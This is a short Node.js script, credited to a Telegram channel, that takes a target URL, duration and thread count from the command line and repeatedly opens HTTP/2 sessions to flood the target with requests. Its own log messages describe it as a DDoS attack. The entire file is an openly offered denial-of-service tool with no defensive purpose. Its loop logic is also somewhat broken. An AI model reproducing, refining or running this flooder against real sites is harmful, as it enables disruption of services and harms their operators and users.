//by https://t.me/devddos
const http2 = require('http2');
const http = require('http');
const url = require('url');
const fs = require('fs');
const net = require('net');
const tls = require('tls');
const stream = require('stream');
const zlib = require('zlib');
const crypto = require('crypto');

let time = process.argv[2];
let threads = process.argv[3];
let target = process.argv[4];

let urlObject = url.parse(target);
let headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
};

let options = {
    port: 443,
    host: urlObject.hostname,
    method: 'GET',
    path: '/',
    headers: headers,
    h2: true,
    rejectUnauthorized: false,
    insecureHTTPParser: true
};

let attack_time = Date.now() + time * 1000;
let threads_array = new Array(threads).fill(0);

console.log(`Attack Start by https://t.me/devddos ${target} for ${time} seconds with ${threads} threads.`);

while (Date.now() < attack_time) {
    threads_array.forEach((thread, index) => {
        let session = http2.connect(target, options);
        session.on('error', (error) => {
            // Handle errors
        });
        let request = session.request(options);
        request.on('response', (headers) => {
            // Handle response
        });
        request.setEncoding('utf8');
        request.write('Attack Payload');
        request.end();
    });
}

console.log(`DDoS attack on ${target} has finished.`);
